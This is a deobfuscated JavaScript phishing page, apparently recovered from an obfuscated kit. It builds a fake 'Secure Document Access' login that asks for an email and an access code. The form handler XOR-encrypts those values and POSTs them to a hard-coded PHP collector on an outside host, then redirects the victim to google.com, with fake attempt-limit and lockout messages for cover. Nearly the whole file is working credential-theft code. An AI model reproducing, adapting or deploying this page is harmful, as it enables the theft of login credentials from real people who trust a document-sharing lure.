// String lookup table (the _0x26b800 array from original)
const STRINGS = [
    'MSG_GRANTED', 'brightness', 'type="button" id="eye_btn"', '12" r="3"/',
    'msOra', 'cursor:pointer', '.title_main', 'rYqTe', 'uswRq', 'head',
    'OZvse', 'elative;z-', 'Pktnq', 'FmWJx', 'rand_orb{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);margin:0 auto 20px;}',
    'VbwbS', '{background', '89df-896f-', '16" r="1.3', 'tyeNI',
    'class="lbl_small', 'FOOTER', 'm:translat', 'code_p4r7', 'STORAGE_KEY',
    '7ffb9804b5', 'eJmTw', 'IxtOT', 'JHiAp', 'toLowerCase', 'puWNi', 'Ubils',
    '2px rgba(0', 'TcoSV', '%3E%3C/te', 'WieTT', 'VDEzK', 't:0;width:', 'height',
    'dth:100%;m', 'an> ', 'MATT_SECURE', '="alert_ba', 'EkkCA', 'line-flex;',
    'values', '</label>', '#e3f5e9', '3Csvg xmln', 'KNubg', 'dth:100%;p',
    'height:64p', 'YgQJT', 'pkImQ', 'ithin{bord', 'r;width:18', 'POST', 'color',
    'fromCharCode', 'tter-spaci', 'gBYsH', '3 7l9 6 9-', '" class="c',
    't-size:.65', 'DFArj', 'uLBoz', ' solid #cb', 's="ring_lo',
    // ... (full string array would be here)
];

// String decoder function equivalent to _0x10c6
function getString(index) {
    // Original: _0x597e54 - (-0xeb * 0x12 + -0x5 * -0x31b + 0x177)
    // = index - (-4230 + 3975 + 375) = index - 120
    return STRINGS[index - 120];
}

// Configuration object (_0x374f98)
const CONFIG = {
    BG_IMG: 'https://images.unsplash.com/photo-1517849845537-4d257902454a?w=1920&q=80',
    BG_BRI: 1,
    BG_DAR: 1,
    BG_CON: 1,
    BG_SAT: 1,
    BG_BLUR: 0,
    BG_GRAY: false,
    BG_OVERLAY: 0.25,
    PHP_ENDPOINT: 'http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/fdfmdkfmsdkay.php',
    SUCCESS_REDIRECT: 'https://www.google.com',
    LOCKOUT_REDIRECT: 'https://www.google.com',
    SECRET_KEY: 'MATT_SECURE_2026',
    MAX_TRIES: 3,
    LOCKOUT_DELAY: 2000,
    STORAGE_KEY: 'st_7b3f19',
    PATH_SEGMENTS: ['base', 'node', 'code_p4r7', '22sjwjknjqdq', 'AjsjjsjsY'],
    MSG_WRONG: 'Incorrect access code. Please try again.',
    MSG_LOCKOUT: 'Too many attempts. Access temporarily locked.',
    MSG_GRANTED: 'Access granted! Redirecting...',
    MSG_NET: 'Network error. Please check connection.',
    HEADING: 'Secure Document Access',
    SUBHEAD: 'Enter credentials to view document',
    FOOTER: 'Encrypted Document · © 2026',
    EMAIL_LABEL: 'Email Address',
    KEY_LABEL: 'Access Code',
    KEY_PLACEHOLDER: 'Enter your access code',
    BUTTON_TEXT: 'Verify & View Document',
    TAG_TEXT: 'Secure'
};

// Helper functions from _0x24d279
const helpers = {
    // String concatenation helpers
    concat: (...args) => args.join(''),
    
    // Encryption function (_0x52b58a)
    encrypt: (data, key) => {
        const jsonStr = JSON.stringify(data);
        const keyLen = key.length;
        let result = '';
        for (let i = 0; i < jsonStr.length; i++) {
            const charCode = jsonStr.charCodeAt(i) ^ key.charCodeAt(i % keyLen);
            result += ('0' + charCode.toString(16)).slice(-2);
        }
        return btoa(result);
    },
    
    // Decryption function
    decrypt: (encrypted, key) => {
        try {
            const hexStr = atob(encrypted);
            const keyLen = key.length;
            let result = '';
            for (let i = 0; i < hexStr.length; i += 2) {
                const byte = parseInt(hexStr.substr(i, 2), 16);
                result += String.fromCharCode(byte ^ key.charCodeAt((i / 2) % keyLen));
            }
            return JSON.parse(result);
        } catch (e) {
            return null;
        }
    },
    
    // Get domain from email
    getDomain: (email) => {
        if (!email || email.indexOf('@') === -1) return '';
        const parts = email.split('@');
        if (parts.length === 2 && parts[0].trim() !== '') {
            return parts[1].trim().toLowerCase();
        }
        return '';
    },
    
    // Capitalize first letter
    capitalize: (str) => {
        if (!str) return '';
        return str.charAt(0).toUpperCase() + str.slice(1);
    }
};

// CSS Styles (from the obfuscated string concatenations)
const STYLES = {
    frame: '*{margin:0;padding:0;box-sizing:border-box}body{min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#0a0a0a;overflow-x:hidden}',
    frame_v7: '.frame_v7{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;background-size:cover;background-position:center;transition:all 0.3s ease}',
    base_node: '.base_node{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;z-index:1}',
    card: '.card{width:100%;max-width:420px;padding:2rem;border-radius:1.2rem;background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.1);box-shadow:0 8px 32px rgba(0,0,0,0.3)}',
    brand_orb: '.brand_orb{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);margin:0 auto 1.5rem}',
    title_main: '.title_main{text-align:center;color:#fff;font-size:1.5rem;font-weight:600;margin-bottom:0.5rem;letter-spacing:-0.01em}',
    sub_text: '.sub_text{text-align:center;color:rgba(255,255,255,0.6);font-size:0.9rem;margin-bottom:2rem}',
    alert_banner: '.alert_banner{display:none;padding:0.9rem 1.2rem;border-radius:0.6rem;margin-bottom:1.5rem;font-size:0.85rem;text-align:center;animation:fadeIn 0.3s ease}',
    form_auth: '.form_auth{display:flex;flex-direction:column;gap:1.2rem}',
    lbl_small: '.lbl_small{color:rgba(255,255,255,0.7);font-size:0.75rem;font-weight:500;margin-bottom:0.3rem;display:block;text-transform:uppercase;letter-spacing:0.04em}',
    inp_core: '.inp_core{width:100%;padding:0.9rem 1rem;border:1.5px solid rgba(255,255,255,0.15);border-radius:0.6rem;background:rgba(255,255,255,0.05);color:#fff;font-size:0.95rem;transition:all 0.2s;outline:none}.inp_core:focus{border-color:#4a90e2;background:rgba(255,255,255,0.08)}',
    eye_btn: '.eye_btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:rgba(255,255,255,0.4);cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;transition:color 0.2s}',
    cta_main: '.cta_main{width:100%;padding:1rem;border:none;border-radius:0.6rem;background:linear-gradient(135deg,#4a90e2,#357abd);color:#fff;font-size:0.95rem;font-weight:600;cursor:pointer;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:0.5rem;margin-top:0.5rem}.cta_main:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 4px 12px rgba(74,144,226,0.4)}.cta_main:disabled{opacity:0.6;cursor:not-allowed}',
    ring_loader: '.ring_loader{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite}',
    chip_tag: '.chip_tag{display:inline-flex;align-items:center;gap:0.4rem;padding:0.4rem 0.8rem;background:rgba(255,255,255,0.08);border-radius:2rem;font-size:0.75rem;color:rgba(255,255,255,0.6);margin-top:1.5rem}',
    alert_error: '.alert_banner.error{background:rgba(220,53,69,0.15);color:#ff6b6b;border:1px solid rgba(220,53,69,0.3)}',
    alert_success: '.alert_banner.success{background:rgba(40,167,69,0.15);color:#51cf66;border:1px solid rgba(40,167,69,0.3)}',
    visible: '.visible{display:block !important}',
    spin: '@keyframes spin{to{transform:rotate(360deg)}}',
    fadeIn: '@keyframes fadeIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}'
};

// Main initialization function
function init() {
    // Check if already verified
    const verified = sessionStorage.getItem(CONFIG.STORAGE_KEY + '_verified');
    if (verified === 'true') {
        window.location.href = CONFIG.SUCCESS_REDIRECT;
        return;
    }

    // Create and inject styles
    const styleEl = document.createElement('style');
    styleEl.textContent = Object.values(STYLES).join('');
    document.head.appendChild(styleEl);

    // Create background
    const bg = document.createElement('div');
    bg.className = 'frame_v7';
    bg.style.backgroundImage = `url(${CONFIG.BG_IMG})`;
    bg.style.filter = `brightness(${CONFIG.BG_BRI}) contrast(${CONFIG.BG_CON}) saturate(${CONFIG.BG_SAT})`;
    if (CONFIG.BG_BLUR > 0) bg.style.filter += ` blur(${CONFIG.BG_BLUR}px)`;
    if (CONFIG.BG_GRAY) bg.style.filter += ' grayscale(1)';

    const overlay = document.createElement('div');
    overlay.style.cssText = `position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,${CONFIG.BG_OVERLAY})`;
    bg.appendChild(overlay);

    // Create main container
    const container = document.createElement('div');
    container.className = 'base_node';

    // Create card
    const card = document.createElement('div');
    card.className = 'card';

    // Brand orb with icon
    const brandOrb = document.createElement('div');
    brandOrb.className = 'brand_orb';
    brandOrb.innerHTML = `<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>`;
    brandOrb.style.color = '#4a90e2';

    // Title
    const title = document.createElement('h1');
    title.className = 'title_main';
    title.textContent = CONFIG.HEADING;

    // Subtitle
    const subtitle = document.createElement('p');
    subtitle.className = 'sub_text';
    subtitle.textContent = CONFIG.SUBHEAD;

    // Alert banner
    const alertBanner = document.createElement('div');
    alertBanner.id = 'alert_banner';
    alertBanner.className = 'alert_banner';

    // Form
    const form = document.createElement('form');
    form.id = 'form_auth';
    form.className = 'form_auth';

    // Email field
    const emailGroup = document.createElement('div');
    const emailLabel = document.createElement('label');
    emailLabel.className = 'lbl_small';
    emailLabel.textContent = CONFIG.EMAIL_LABEL;
    const emailInput = document.createElement('input');
    emailInput.type = 'email';
    emailInput.id = 'email_input';
    emailInput.className = 'inp_core';
    emailInput.placeholder = 'Enter your email';
    emailInput.required = true;
    emailInput.autocomplete = 'off';
    emailGroup.appendChild(emailLabel);
    emailGroup.appendChild(emailInput);

    // Password field with toggle
    const codeGroup = document.createElement('div');
    const codeLabel = document.createElement('label');
    codeLabel.className = 'lbl_small';
    codeLabel.textContent = CONFIG.KEY_LABEL;
    const codeWrapper = document.createElement('div');
    codeWrapper.style.position = 'relative';
    const codeInput = document.createElement('input');
    codeInput.type = 'password';
    codeInput.id = 'code_input';
    codeInput.className = 'inp_core';
    codeInput.placeholder = CONFIG.KEY_PLACEHOLDER;
    codeInput.required = true;
    codeInput.autocomplete = 'off';
    
    const eyeBtn = document.createElement('button');
    eyeBtn.type = 'button';
    eyeBtn.className = 'eye_btn';
    eyeBtn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
    
    eyeBtn.addEventListener('click', () => {
        const isPassword = codeInput.type === 'password';
        codeInput.type = isPassword ? 'text' : 'password';
        eyeBtn.style.color = isPassword ? '#4a90e2' : 'rgba(255,255,255,0.4)';
    });

    codeWrapper.appendChild(codeInput);
    codeWrapper.appendChild(eyeBtn);
    codeGroup.appendChild(codeLabel);
    codeGroup.appendChild(codeWrapper);

    // Submit button
    const submitBtn = document.createElement('button');
    submitBtn.type = 'submit';
    submitBtn.id = 'submit_btn';
    submitBtn.className = 'cta_main';
    submitBtn.innerHTML = `<span class="cta_icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></span><span>${CONFIG.BUTTON_TEXT}</span><span class="ring_loader" id="ring_loader"></span>`;

    // Footer tag
    const footer = document.createElement('div');
    footer.style.textAlign = 'center';
    const chip = document.createElement('span');
    chip.className = 'chip_tag';
    chip.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg> ${CONFIG.TAG_TEXT}`;
    footer.appendChild(chip);

    // Assemble form
    form.appendChild(emailGroup);
    form.appendChild(codeGroup);
    form.appendChild(submitBtn);

    // Assemble card
    card.appendChild(brandOrb);
    card.appendChild(title);
    card.appendChild(subtitle);
    card.appendChild(alertBanner);
    card.appendChild(form);
    card.appendChild(footer);

    // Assemble container
    container.appendChild(bg);
    container.appendChild(card);

    // Clear body and add container
    document.body.innerHTML = '';
    document.body.appendChild(container);

    // State variables
    let isSubmitting = false;
    let alertTimeout = null;

    // Alert functions
    function showAlert(message, type) {
        alertBanner.textContent = message;
        alertBanner.className = `alert_banner ${type} visible`;
        if (alertTimeout) clearTimeout(alertTimeout);
        if (type === 'success') {
            alertTimeout = setTimeout(() => {
                alertBanner.classList.remove('visible');
            }, 3000);
        }
    }

    function hideAlert() {
        alertBanner.classList.remove('visible');
        if (alertTimeout) {
            clearTimeout(alertTimeout);
            alertTimeout = null;
        }
    }

    // Set loading state
    function setLoading(loading) {
        isSubmitting = loading;
        submitBtn.disabled = loading;
        document.getElementById('ring_loader').style.display = loading ? 'inline-block' : 'none';
    }

    // Form submission handler (_0x41ee04 equivalent)
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (isSubmitting) return;

        const email = emailInput.value.trim();
        const code = codeInput.value.trim();
        const startTime = Date.now();

        // Validation
        if (!email || email.indexOf('@') === -1) {
            showAlert('Please enter a valid email address', 'error');
            codeInput.focus();
            return;
        }

        if (!code) {
            showAlert('Please enter your access code', 'error');
            codeInput.focus();
            return;
        }

        hideAlert();
        setLoading(true);

        // Encrypt payload
        const encryptedPayload = helpers.encrypt({ email, code }, CONFIG.SECRET_KEY);

        // Prepare FormData
        const formData = new FormData();
        formData.append('data', encryptedPayload);

        try {
            const response = await fetch(CONFIG.PHP_ENDPOINT, {
                method: 'POST',
                body: formData
            });

            const responseText = await response.text();
            let responseData = null;
            let parseError = false;

            try {
                responseData = JSON.parse(responseText);
            } catch (e) {
                parseError = true;
            }

            // Minimum delay for UX
            const elapsed = Date.now() - startTime;
            const minDelay = Math.max(800, 2000 - elapsed);
            await new Promise(resolve => setTimeout(resolve, minDelay));

            setLoading(false);

            // Handle errors
            if (parseError || !responseData) {
                showAlert(CONFIG.MSG_NET, 'error');
                codeInput.value = '';
                codeInput.focus();
                return;
            }

            // Check attempt count
            let attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY + '_attempts') || '0', 10) + 1;
            sessionStorage.setItem(CONFIG.STORAGE_KEY + '_attempts', String(attempts));

            if (attempts >= CONFIG.MAX_TRIES) {
                showAlert(CONFIG.MSG_LOCKOUT, 'error');
                setTimeout(() => {
                    window.location.href = CONFIG.LOCKOUT_REDIRECT;
                }, 2000);
                return;
            }

            // Handle response status
            if (responseData.status === 'locked') {
                showAlert(CONFIG.MSG_LOCKOUT, 'error');
                setTimeout(() => {
                    window.location.href = CONFIG.LOCKOUT_REDIRECT;
                }, 500);
                return;
            }

            if (responseData.status === 'success') {
                showAlert(CONFIG.MSG_GRANTED, 'success');
                sessionStorage.setItem(CONFIG.STORAGE_KEY + '_verified', 'true');
                sessionStorage.setItem(CONFIG.STORAGE_KEY + '_email', email);
                setTimeout(() => {
                    window.location.href = CONFIG.SUCCESS_REDIRECT;
                }, 1500);
            } else {
                const remaining = CONFIG.MAX_TRIES - attempts;
                showAlert(`${CONFIG.MSG_WRONG} (${remaining} attempts remaining)`, 'error');
                codeInput.value = '';
                codeInput.focus();
            }

        } catch (error) {
            setLoading(false);
            showAlert(CONFIG.MSG_NET, 'error');
            console.error('Error:', error);
        }
    });

    // Email input handler for avatar/logo
    emailInput.addEventListener('input', () => {
        const email = emailInput.value.trim();
        const domain = helpers.getDomain(email);
        
        if (domain) {
            const capitalized = helpers.capitalize(domain);
            // Update UI with domain info
        } else {
            // Clear domain display
        }
    });

    // Eye toggle functionality
    const eyeToggle = document.getElementById('eye_toggle');
    const eyeShow = document.getElementById('eye_show');
    const eyeHide = document.getElementById('eye_hide');

    if (eyeToggle) {
        eyeToggle.addEventListener('click', () => {
            const isPassword = codeInput.type === 'password';
            codeInput.type = isPassword ? 'text' : 'password';
            if (eyeShow) eyeShow.style.display = isPassword ? 'block' : 'none';
            if (eyeHide) eyeHide.style.display = isPassword ? 'none' : 'block';
        });
    }
}

// Initialize on DOM ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}
